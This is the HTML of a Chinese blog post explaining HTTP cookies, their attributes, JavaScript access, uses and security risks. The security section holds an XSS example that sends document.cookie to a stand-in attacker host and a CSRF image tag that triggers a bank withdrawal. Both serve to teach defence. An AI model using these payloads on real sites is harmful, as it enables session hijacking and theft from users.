@@ -1,0 +1,931 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Lobster Two:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css">
+
+
+  <meta name="keywords" content="cookie,http,">
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.png?v=5.1.1">
+
+
+
+
+
+
+<meta name="description" content="我们知道cookie可以用来在客户端的浏览器上存储一小戳数据，那当初行业的前辈们为什么要设计cookie这种机制呢？因为HTTP是无状态的，如果不做记录，没人知道谁来服务器上请求过，请求的一方也无法证明自己是谁。试想一下在没有cookie时使用一个需要用户登录的网站，那用户从网上发出去的每一个请求，服务器端都得要求用户先登录一遍，然后再下发所需要的数据，这真是糟透的了体验。如果这些跟每个用户相关的">
+<meta name="keywords" content="cookie,http">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTTP cookie">
+<meta property="og:url" content="http://shinancao.github.io/2019/04/15/HTTP-Cookie/index.html">
+<meta property="og:site_name" content="意林的小站">
+<meta property="og:description" content="我们知道cookie可以用来在客户端的浏览器上存储一小戳数据，那当初行业的前辈们为什么要设计cookie这种机制呢？因为HTTP是无状态的，如果不做记录，没人知道谁来服务器上请求过，请求的一方也无法证明自己是谁。试想一下在没有cookie时使用一个需要用户登录的网站，那用户从网上发出去的每一个请求，服务器端都得要求用户先登录一遍，然后再下发所需要的数据，这真是糟透的了体验。如果这些跟每个用户相关的">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://shinancao.github.io/images/cookie-response.png">
+<meta property="og:image" content="http://shinancao.github.io/images/cookie-request.png">
+<meta property="og:image" content="http://shinancao.github.io/images/cookie.png">
+<meta property="og:updated_time" content="2020-08-03T07:58:35.218Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="HTTP cookie">
+<meta name="twitter:description" content="我们知道cookie可以用来在客户端的浏览器上存储一小戳数据，那当初行业的前辈们为什么要设计cookie这种机制呢？因为HTTP是无状态的，如果不做记录，没人知道谁来服务器上请求过，请求的一方也无法证明自己是谁。试想一下在没有cookie时使用一个需要用户登录的网站，那用户从网上发出去的每一个请求，服务器端都得要求用户先登录一遍，然后再下发所需要的数据，这真是糟透的了体验。如果这些跟每个用户相关的">
+<meta name="twitter:image" content="http://shinancao.github.io/images/cookie-response.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://shinancao.github.io/2019/04/15/HTTP-Cookie/">
+
+
+
+
+
+  <title>HTTP cookie | 意林的小站</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">意林的小站</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">Be a cool girl ~</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-portfolio">
+          <a href="/portfolio/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-code"></i> <br>
+            
+            项目
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://shinancao.github.io/2019/04/15/HTTP-Cookie/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="意林">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="意林的小站">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">HTTP cookie</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-15T13:40:32+08:00">
+                2019-04-15
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web/" itemprop="url" rel="index">
+                    <span itemprop="name">Web</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web/HTTP/" itemprop="url" rel="index">
+                    <span itemprop="name">HTTP</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>我们知道cookie可以用来在客户端的浏览器上存储一小戳数据，那当初行业的前辈们为什么要设计cookie这种机制呢？因为HTTP是无状态的，如果不做记录，没人知道谁来服务器上请求过，请求的一方也无法证明自己是谁。试想一下在没有cookie时使用一个需要用户登录的网站，那用户从网上发出去的每一个请求，服务器端都得要求用户先登录一遍，然后再下发所需要的数据，这真是糟透的了体验。如果这些跟每个用户相关的有时效性的数据能够通过浏览器的支持保存在客户端本地，就很完美的解决了问题。</p>
+<p>下面来看一下MDN上对cookie的说明：</p>
+<blockquote>
+<p>HTTP Cookie（也叫Web Cookie或浏览器Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie使基于无状态的HTTP协议记录稳定的状态信息成为了可能。</p>
+</blockquote>
+<a id="more"></a>
+<h2 id="初识cookie"><a href="#初识cookie" class="headerlink" title="初识cookie"></a>初识cookie</h2><p>要看到cookie并不难，打开浏览器的开发工具，点开一个request就可以观察到了。比如我这里访问<a href="https://www.vip.com/" target="_blank" rel="noopener">https://www.vip.com/</a>登录成功后点开<a href="https://www.vip.com/" target="_blank" rel="noopener">https://www.vip.com/</a>，在Headers一列中可以看到Response Headers和Request Headers都有cookie部分：</p>
+<p><img src="/images/cookie-response.png"></p>
+<p><img src="/images/cookie-request.png"></p>
+<p>可以看到服务器端只要在HTTP响应头中加上一条<code>Set-Cookie</code>，就创建了一条cookie记录。</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Content-type: text/html; <span class="attribute">charset</span>=utf-8</span><br><span class="line">Set-Cookie: <span class="attribute">vip_province</span>=104104; <span class="attribute">expires</span>=Sat, 11-Apr-2020 09:28:14 GMT; <span class="attribute">Max-Age</span>=2592000; <span class="attribute">path</span>=/; <span class="attribute">domain</span>=.vip.com</span><br><span class="line"><span class="built_in">..</span>.</span><br></pre></td></tr></table></figure>
+<p>在客户端发起请求时在请求头中也会带上<code>Cookie</code>字段。</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: <span class="attribute">vip_province</span>=104104; <span class="built_in">..</span>.</span><br></pre></td></tr></table></figure>
+<p>创建cookie的时候，除了cookie的name和value外，我们看到还有一些其他属性可指定，回到浏览器的开发工具，打开Cookies一栏：</p>
+<p><img src="/images/cookie.png"></p>
+<p>这里看到除了<code>Name</code>和<code>Value</code>，一条cookie还可以设置<code>Domain</code>、<code>Path</code>、<code>Expires/Max-Age</code>、<code>Size</code>、<code>HttpOnly</code>、<code>Secure</code>、<code>SameSite</code>等属性，接下来分别说一下这些属性的作用和如何指定。</p>
+<p><strong>Domain</strong> &amp; <strong>Path</strong></p>
+<p>浏览器需要知道自己存储的cookies应该分别发给哪些URL，所以<code>Domain</code>和<code>Path</code>标记就明确了cookie的作用域。<code>Domain</code>标识指定了哪些主机可以接受cookie。如果不指定，默认是当前请求页面的主机，但不包含子域名。如果指定了，则一般包含子域名。</p>
+<p>例如，设置<code>Domain=foo.com</code>，则Cookie也包含在子域中（如<code>docs.foo.com</code>）。截图中的<code>Domain</code>指定为<code>.vip.com</code>，这里域名前多了一个点，在最新的标准中这是可选的，但是加上了可以兼容<a href="https://tools.ietf.org/html/rfc2109" target="_blank" rel="noopener">RFC 2109</a>。</p>
+<p><code>Path</code>标识指定了主机下的哪些路径可以接受cookie（该URL路径必须存在于请求URL中），以字符<code>%2F</code>（“/”）作为分隔符，子路径也会被匹配。</p>
+<p>再举个栗子，请求<code>docs.foo.com</code>后响应回的cookie如下：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Set-Cookie: <span class="attribute">LSID</span>=DQAAAK…Eaem_vYg; <span class="attribute">Path</span>=/accounts; <span class="attribute">Expires</span>=Wed, 13 Jan 2021 22:23:01 GMT; Secure; HttpOnly</span><br><span class="line">Set-Cookie: <span class="attribute">HSID</span>=AYQEVn…DKrdst; <span class="attribute">Domain</span>=.foo.com; <span class="attribute">Path</span>=/; <span class="attribute">Expires</span>=Wed, 13 Jan 2021 22:23:01 GMT; HttpOnly</span><br><span class="line">Set-Cookie: <span class="attribute">SSID</span>=Ap4P…GTEq; <span class="attribute">Domain</span>=foo.com; <span class="attribute">Path</span>=/; <span class="attribute">Expires</span>=Wed, 13 Jan 2021 22:23:01 GMT; Secure; HttpOnly</span><br><span class="line">…</span><br></pre></td></tr></table></figure>
+<p>第一个cookie，<code>LSID</code>，没有指定<code>Domain</code>属性，但是<code>Path</code>指定为<code>/accounts</code>，这告诉浏览器该cookie只能发送给<code>docs.foo.com/accounts</code>下面的页面。其他两个，<code>HSID</code>和<code>SSID</code>，可以发送给<code>.foo.com</code>下面的任意子域。</p>
+<p><strong>Expires/Max-Age</strong></p>
+<p>一条cookie记录不是一旦创建就永久存在的，浏览器需要知道cookie何时失效。所以要用<code>Expires</code>指定过期时间或<code>Max-Age</code>指定有效期时长。从上面的截图中，我们看到<code>Expires/Max-Age</code>有这几种取值情况：<code>Session</code>、具体时间（如 <code>2020-03-16T01:34:21.253</code>）、时长（如 <code>1.0 days</code>、<code>8.0 hrs</code>）。</p>
+<p>设置为<code>Session</code>的cookie也叫会话期cookie，标记为<code>Session</code>的cookie只是临时存放于内存中，浏览器关闭时，cookie也会被删除。</p>
+<p>设置了具体过期时间或具体有效时长的cookie也叫持久性cookie，这样的cookie在有效期内每一次请求都会被带上，失效后是被删除还是还留在在本地要看各家浏览器是如何处理的了，但是以后再请求同样的URL不会带上该cookie。</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Set-Cookie: <span class="attribute">lu</span>=Rg3vHJZnehYLjVg7qi3bZjzg; <span class="attribute">Expires</span>=Tue, 15 Jan 2013 21:47:38 GMT; <span class="attribute">Path</span>=/; <span class="attribute">Domain</span>=.example.com; HttpOnly</span><br><span class="line">Set-Cookie: <span class="attribute">made_write_conn</span>=1295214458; <span class="attribute">Path</span>=/; <span class="attribute">Domain</span>=.example.com</span><br><span class="line">Set-Cookie: <span class="attribute">reg_fb_gate</span>=deleted; <span class="attribute">Expires</span>=Thu, 01 Jan 1970 00:00:01 GMT; <span class="attribute">Path</span>=/; <span class="attribute">Domain</span>=.example.com; HttpOnly</span><br></pre></td></tr></table></figure>
+<p>第一个cookie，<code>lu</code>，将会在2013年1月15日过期。第二个cookie，<code>made_write_conn</code>，没有指定<code>Expires</code>，默认是<code>Session</code> cookie，在浏览器关闭后就会被删除。第三个cookie，<code>reg_fb_gate</code>，已经过期了，浏览器收到后会立即删除。</p>
+<p>截止2016年，Internet Explorer 已经不支持<code>Max-Age</code>了。</p>
+<p><strong>HttpOnly</strong></p>
+<p>标记为<code>HttpOnly</code>的cookie不能被Javascript访问，可以防止跨域脚本攻击（XSS）。这样的cookie只应该发送给服务器端。</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Set</span>-Cookie: CookieName=CookieValue; HttpOnly</span><br></pre></td></tr></table></figure>
+<p><strong>Secure</strong></p>
+<p>标记为<code>Secure</code>的cookie只应通过被HTTPS协议加密过的请求发送给服务器，这降低了cookie被监听到的可能性。</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Set</span>-Cookie: CookieName=CookieValue; Secure</span><br></pre></td></tr></table></figure>
+<p><strong>SameSite</strong></p>
+<p><code>SameSite</code> cookie允许服务器要求某个cookie在跨站请求时不会被发送，从而可以阻止跨站请求伪造攻击（CSRF）。</p>
+<p><code>SameSite</code> cookie是2016年Google Chrome提出的，现在主流的浏览器都已支持。</p>
+<p><code>SameSite</code>可以有下面三种取值：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: <span class="attribute">CookieName</span>=CookieValue; <span class="attribute">SameSite</span>=None;</span><br><span class="line">Set-Cookie: <span class="attribute">CookieName</span>=CookieValue; <span class="attribute">SameSite</span>=Strict;</span><br><span class="line">Set-Cookie: <span class="attribute">CookieName</span>=CookieValue; <span class="attribute">SameSite</span>=Lax;</span><br></pre></td></tr></table></figure>
+<p><strong><code>None</code></strong></p>
+<p>浏览器会在同站请求、跨站请求下继续发送cookie，不区分大小写。</p>
+<p><strong><code>Strict</code></strong></p>
+<p>浏览器只发送相同站点请求的cookie（即当前网页的URL与请求目标URL完全一致）。如果发送与当前Location的URL不同的URL，则标记为<code>Strict</code>的cookie不会被带上。</p>
+<p>比如，在本博客中放了我的github链接，如果github将其cookie的<code>SameSite</code>标记为<code>Strict</code>，那么从本博客跳转到github时一直都会是未登录的状态，这样的体验有时不是很友好。</p>
+<p><strong><code>Lax</code></strong></p>
+<p><code>Lax</code>规则稍微放宽，大多数情况也是不发送第三方Cookie，但是导航到目标网址的Get请求除外。导航到目标网址的Get请求：链接、预加载请求、Get表单：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 链接 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"..."</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 预加载 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"prerender"</span> <span class="attr">href</span>=<span class="string">"..."</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- GET表单 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"GET"</span> <span class="attr">action</span>=<span class="string">"..."</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="Javascript操作cookie"><a href="#Javascript操作cookie" class="headerlink" title="Javascript操作cookie"></a>Javascript操作cookie</h2><p>通过Javascript提供的<code>document.cookie</code>，也可以在前端拿到当前页面的Host下所有的本地cookie，也可以写入新的cookie。</p>
+<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取所有cookie，所以只想取name为特定值的cookie需要在此基础上做一些处理</span></span><br><span class="line">allCookies = <span class="built_in">document</span>.cookie</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写入一个新的cookie</span></span><br><span class="line"><span class="built_in">document</span>.cookie = <span class="string">"cookieName=cookieValue"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除一个已有的cookie</span></span><br><span class="line"><span class="built_in">document</span>.cookie = <span class="string">"cookieName="</span></span><br></pre></td></tr></table></figure>
+<p>有几点需要注意，<code>document.cookie</code>只能读取非<code>HttpOnly</code>的cookie。cookie的值字符串可以用encodeURIComponent()来保证它不包含任何逗号、分号或空格(cookie值中禁止使用这些值)。而且cookie的值也是被浏览器格式化后才存起来的，所以取出时要用decodeURIComponent()解码。</p>
+<p>MDN上提供了一个完整的可用的框架，可参考其实现：</p>
+<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie" target="_blank" rel="noopener">一个小框架：一个完整支持unicode的cookie读取/写入器</a></p>
+<p>github上也有很多封装<code>document.cookie</code>的开源的库，这里分享一个Star数较高的：</p>
+<p><a href="https://github.com/js-cookie/js-cookie" target="_blank" rel="noopener">https://github.com/js-cookie/js-cookie</a></p>
+<h2 id="cookie的使用场景"><a href="#cookie的使用场景" class="headerlink" title="cookie的使用场景"></a>cookie的使用场景</h2><p><strong>Session 管理</strong></p>
+<p>服务器端生成一个<code>session_id</code>，写入用户的cookie，下次客户端发起请求再将该cookie带回来，服务器端就能识别出是哪个用户过来访问。两个典型的应用就是购物车和登录。用这个<code>session_id</code>服务器端知道是谁过来了，并且已经授权访问服务器上的数据，那么在用户一次浏览网站的过程中就不用一直登录验证了，并且可以取到与自己相关的数据。</p>
+<p><strong>实现个性化</strong></p>
+<p>比如cookie里存了username，下次用户再来访问网站时，就可以将用户名自动填充上。</p>
+<p>再比如网站可以允许用户做一些个性化设置，像现在很多网站都有夜间模式，用户对网站进行的个性化设计就可以保存在cookie中。</p>
+<p><strong>用户行为追踪</strong></p>
+<p>cookie也可以用来追踪用户的网站浏览习惯。当然，也可以通过访问页面的IP地址和HTTP头里的<code>referer</code>字段来追踪，但是cookie可以提供更加精准的分析。</p>
+<ol>
+<li><p>如果用户请求页面时，请求头中没有带追踪cookie，服务器端认为是第一次访问，并生成一个唯一标识符放在cookie中一起返回给客户端。</p>
+</li>
+<li><p>下次用户再来访问网站时这个cookie也会被一起发送，服务器端就可以把请求的URL、请求时间和该cookie一起记录在日志文件中。</p>
+</li>
+</ol>
+<p>通过分析日志文件就可以大概知道用户浏览过哪些页面，以及浏览频率和浏览时长。</p>
+<p>很多的广告厂商也通过cookie来追踪用户的浏览行为。如果cookie的<code>Domain</code>属性值跟当前地址栏中的域名匹配，则这样的cookie为<em>第一方cookie</em>。如果不匹配，则为<em>第三方cookie</em>。比如，用户当前正在访问<code>www.example.org</code>，这个网站里有个广告来自<code>ad.foxytracking.com</code>，当广告被加载时，创建一个cookie属于<code>ad.foxytracking.com</code>。广告厂商就可以通过所有放了他们广告的网站发送过来的cookie，分析出用户的浏览行为习惯。</p>
+<h2 id="cookie带来的安全性问题"><a href="#cookie带来的安全性问题" class="headerlink" title="cookie带来的安全性问题"></a>cookie带来的安全性问题</h2><p>如果网站使用cookie作为会话的唯一标识，那么攻击者一旦拿到了用户的cookie，就可以使用该cookie冒充用户访问网站，而服务端会把他当合法用户对待。下面列出几种常见的攻击方式：</p>
+<p><strong>网络监听</strong></p>
+<p>关于网络监听的原理，大家可以看一下<a href="https://tomcat.one/files/papers/%E7%BD%91%E7%BB%9C%E7%9B%91%E5%90%AC%E4%B8%8E%E5%8F%8D%E7%9B%91%E5%90%AC_%E8%B4%BA%E9%BE%99%E6%B6%9B.pdf" target="_blank" rel="noopener">这篇论文</a>介绍。网络监听一般都发生在局域网，如果跟攻击者连入了同一网络，那么在该网络中传输的数据就会被攻击者截获到，网站的cookie也就有可能被拿到。攻击者可以使用拿到的cookie去执行恶意行为，比如转移出用户银行帐号里的钱。</p>
+<p>如果网络中传输的数据是被加密过的，即使被拦截到也无法读出来。所以采用HTTPS协议的网站通常被认为是安全的。服务器端在创建cookie时，可以指定<code>Secure</code>，浏览器不会发送<code>Secure</code> cookie给未加密的请求。</p>
+<p><strong>发布假的子域名：域名服务器缓存污染</strong></p>
+<p>我们访问网站的域名，首先会经过DNS服务器解析出目标服务器的IP地址，然后再去访问该IP地址的服务器。<a href="https://zh.wikipedia.org/wiki/%E5%9F%9F%E5%90%8D%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%BC%93%E5%AD%98%E6%B1%A1%E6%9F%93" target="_blank" rel="noopener">域名服务器缓存污染</a>就是要用户访问的域名解析到攻击者的服务器IP上，访问了攻击者的服务器就有可能把用户的cookie带过去。比如攻击者利用域名服务器缓存污染将<code>f12345.www.example.com</code>指向他们的服务器IP，然后他们放上去一个图片，比如地址是<code>http://f12345.www.example.com/img_4_cookie.jpg</code>，当用户访问这张图片时，因为<code>f12345.www.example.com</code>是<code>www.example.com</code>的子域名，用户的浏览器就会把<code>example.com</code>相关的cookie都发送过去。</p>
+<p>使用<code>Secure</code> cookie可以减少攻击的严重程度，因为这给攻击者增加了额外的挑战，获取到目标站点的TLS证书。</p>
+<p><strong>XSS攻击</strong></p>
+<p>XSS（Cross-site scripting）跨站脚本攻击：攻击者通过提交恶意的HTML和Javascript内容到服务器，像下面这样，等内容再下发给客户端的时候，用户不小心点击，cookie就会被发送到攻击者的地址。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span> <span class="attr">onclick</span>=<span class="string">"window.location = 'http://attacker.com/stole.cgi?text=' + escape(document.cookie); return false;"</span>&gt;</span>Click here!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>网站的开发者有责任过滤掉恶意代码。此外敏感的cookie指定<code>HttpOnly</code>标识，这样就无法通过Javascript获取cookie了。这里有一篇美团技术团队博客的文章：<a href="https://tech.meituan.com/2018/09/27/fe-security.html" target="_blank" rel="noopener">如何防止XSS攻击</a>，可以学习一下。</p>
+<p><strong>XSRF攻击</strong></p>
+<p>CSRF（Cross-site request forgery）跨站请求伪造：攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。</p>
+<p>举个例子，Bob正在浏览一个聊天论坛，Mallory发了一张图片，这是一个HTML的image元素，但是是指向Bob的银行站点，而不是真正的图片文件。</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="params">&lt;img src="http://bank.example.com/withdraw?account=bob<span class="variable">&amp;amount</span>=<span class="number">1000000</span><span class="variable">&amp;for</span>=mallory"&gt;</span></span><br></pre></td></tr></table></figure>
+<p>如果Bob的银行站点将授权信息保存在cookie中，cookie也没有过期，那么浏览器在尝试加载图片时，实际却向银行站点提交取款表单。这里有一篇美团技术团队博客的文章：<a href="https://tech.meituan.com/2018/10/11/fe-security-csrf.html" target="_blank" rel="noopener">如何防止CSRF攻击</a>，可以学习一下。</p>
+<h2 id="cookie的缺点"><a href="#cookie的缺点" class="headerlink" title="cookie的缺点"></a>cookie的缺点</h2><ol>
+<li><p>cookie的大小受浏览器的限制，大多数浏览器限制cookie 4K，但一些新的浏览器支持最大8K。</p>
+</li>
+<li><p>用户可以配置浏览器禁用cookie能力，因此限制了这一功能。</p>
+</li>
+<li><p>cookie存在安全性问题，像上一节提到的。</p>
+</li>
+</ol>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><strong>【1】</strong> <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies</a></p>
+<p><strong>【2】</strong> <a href="https://en.wikipedia.org/wiki/HTTP_cookie" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/HTTP_cookie</a></p>
+<p><strong>【3】</strong> <a href="https://www.ruanyifeng.com/blog/2019/09/cookie-samesite.html" target="_blank" rel="noopener">https://www.ruanyifeng.com/blog/2019/09/cookie-samesite.html</a></p>
+<p><strong>【4】</strong> <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie</a></p>
+<div class="note info"><p><strong>本文作者：</strong>意林<br><strong>本文链接：</strong><a href="http://shinancao.cn/2020/04/15/HTTP-Cookie/" target="_blank" rel="noopener">http://shinancao.cn/2020/04/15/HTTP-Cookie/</a><br><strong>版权声明：</strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" target="_blank" rel="noopener">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！</p>
+</div>
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/cookie/" rel="tag"># cookie</a>
+          
+            <a href="/tags/http/" rel="tag"># http</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/04/01/Functional-JavaScript-Part1/" rel="next" title="《Functional Programming in JavaScript》Note - Part1">
+                <i class="fa fa-chevron-left"></i> 《Functional Programming in JavaScript》Note - Part1
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/04/27/Programming-Git-Remote/" rel="prev" title="说一说git的几个命令remote、checkout、fetch、pull">
